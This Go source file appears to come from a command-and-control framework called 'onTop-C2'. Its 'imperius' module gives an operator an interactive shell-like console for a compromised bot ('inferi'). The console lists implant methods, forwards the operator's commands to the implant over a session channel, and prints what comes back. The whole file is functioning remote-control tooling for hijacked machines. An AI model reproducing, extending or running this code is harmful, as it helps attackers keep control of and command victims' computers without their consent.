package chambers

import (
	"fmt"
	"io"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"text/tabwriter"

	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/types"

	"github.com/chzyer/readline"
)

var imperius types.Chamber = types.Chamber{
	Name: 			"imperius",
	Description: 	"Interact with INFERIs",
	Parallel: 		false,
	Runes: 			imperiusRunes,
	Execute: 		InteractWithSession,

}

var imperiusRunes map[string]*types.Rune = map[string]*types.Rune{
	"INFERI": {
		Name: "INFERI",
		Description: "The target inferi-id to handle interaction",
		Required: true,
		Value: "",

	},

}

var interruptChannel chan struct{} = make(chan struct{})
func InteractWithSession(runes map[string]*types.Rune) {
	idOpt, ok := runes["INFERI"]
	if !ok || idOpt.Value == "" {
		misc.PanicWarn("The rune 'INFERI' is unset\n", true)
		return

	}
	
	inferi, ok := Inferis[idOpt.Value]
	if !ok {
		misc.PanicWarn(fmt.Sprintf("Not found inferi with id %s\n", idOpt.Value), true)
		return

	}

	err := misc.ForceClearStdout()
	if err != nil {
		misc.PanicWarn(fmt.Sprintf("An error occurred during stdout forced clear: %v\n", err), true)
		return

	}

	botIp, _ := misc.Colors(inferi.BotIP, "green")
	promptSignal, _ := misc.Colors("⌁ ", "white_bold")
	prompt := fmt.Sprintf("%s %s", botIp, promptSignal)
	signal.Stop(misc.InterruptSigs)
	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)

	misc.PrintBanner()
	misc.ChanInterruptHandler(interruptChannel)
	rl, ee := readline.New(prompt)
	if ee != nil {
		misc.PanicWarn(fmt.Sprintf("Some error occurred during readline initialization: %v\n", ee), true)
		return

	}

	writer := tabwriter.NewWriter(os.Stdout, 0, 0, 4, ' ', 0)
	
	os.Setenv("disableErrorPrintsFromMarauder", "ye")
	defer os.Unsetenv("disableErrorPrintsFromMarauder")

	for {
		select {
		case <- interruptChannel:
			signal.Stop(misc.ChanInterruptSigs)
			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
			return

		default:
			l, err := rl.Readline()
			if err == readline.ErrInterrupt || err == io.EOF {
				return

			}

			userCmd := strings.TrimSpace(l)
			if userCmd == "" {
				continue

			}

			switch {
			case strings.HasPrefix(userCmd, "help"):
				fmt.Print("Avaliable commands/methods:\n")
				fmt.Fprintf(writer, "\t%s\t%s\t%s\t%s\n", "Name", "Description", "Command", "Usage example")
				commands := inferi.Spell.Methods
				commands["help"] = &types.SpellMethod{
					Name: "Help",
					Description: "Shows this menu",
					UsageExample: "help",
					OperatorSideCommand: "help",

				}

				for _, v := range commands {
					fmt.Fprintf(writer, "\t%s\t%s\t%s\t%s\n", v.Name, v.Description, v.OperatorSideCommand, v.UsageExample)

				}
				
				writer.Flush()
				fmt.Print('\n')
				continue


			default:
				var (
					found bool
					method types.SpellMethod
				
				)

				for _, v := range inferi.Spell.Methods {
					if strings.HasPrefix(userCmd, v.OperatorSideCommand) {
						found = true
						method = *v

					}

				}

				if found {
					cmd, err := inferi.Spell.InsertCommand(method.ImplantSideCommand, 
						[]byte(strings.TrimSpace(
							strings.TrimSuffix(strings.TrimPrefix(userCmd, method.OperatorSideCommand), "\n"),
							
					)))

					if err != nil {
						misc.PanicWarn(fmt.Sprintf("Some error occurred during insertCommand attempt: %v\n\n", err), true)
						continue

					}

					inferi.In <- cmd
					out := <-inferi.Out
					fmt.Println(string(out))
					break

				}

				misc.PanicWarn("Command not found, run help to view avaliables commands\n", false)

			}

		}

	}

}

func init() {
	RegisterNewModule(&imperius)

}